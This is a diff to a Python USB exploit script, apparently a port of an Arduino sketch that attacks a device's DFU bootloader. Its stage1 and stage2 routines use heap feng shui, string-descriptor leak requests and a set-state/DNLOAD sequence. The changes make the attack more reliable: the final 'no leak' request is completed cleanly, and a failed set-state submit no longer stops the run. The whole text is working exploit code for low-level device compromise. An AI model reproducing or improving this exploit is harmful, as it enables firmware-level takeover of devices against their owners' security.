@@ -590,7 +590,16 @@ def stage1(usb, serial_idx, leak_count, mode, spin_us, leak_delay_ms, debug):
             time.sleep(leak_delay_ms / 1000.0)
         if attempts % 100 == 0:
             print('  %d/%d' % (success, leak_count))
-    heap_feng_shui_req(usb, handle, serial_idx, 0x81, mode, spin_us, debug)  # no leak
+    # The sketch's final heap_feng_shui_req(0x81, true) is 'no leak' by design:
+    # it must complete cleanly so nothing stays pending when stage 2 begins.
+    # An abandoned mid-serve transfer leaves the device waiting to serve more
+    # IN packets and the next SETUP hangs (set-state timeout on --no-reentry).
+    rc, info = usb.raw_ctrl(handle, 0x80, REQ_GET_DESCRIPTOR,
+                            (STRING_DESCRIPTOR << 8) | serial_idx, HABR_LANG,
+                            0x81, b'', abandon=False, timeout_ms=1000,
+                            name='final 0x81 (no leak)')
+    if debug:
+        debug_raw('final 0x81 no-leak', rc, info)
     if leak_delay_ms:
         time.sleep(leak_delay_ms / 1000.0)
     print('  feng shui done (%d attempts)' % attempts)
@@ -621,9 +630,10 @@ def stage2(usb, out_spin_us, padding, debug, live_handle=None):
                                 name='set-state OUT')
     if debug:
         debug_raw('set-state OUT', rc, info)
+    # The sketch prints the per-packet rcodes and continues whatever they are;
+    # a timed-out status handshake here is survivable (the data was accepted).
     if rc != 0:
-        usb.release(handle)
-        raise SystemExit('error: set-state OUT submit failed (%d)' % rc)
+        print('  warning: set-state OUT rc=%d (continuing like the sketch)' % rc)
     if info and info[0] != 0:
         print('  warning: set-state OUT status=%s (continuing)' % status_name(info[0]))
     # (e) zero-length DNLOAD
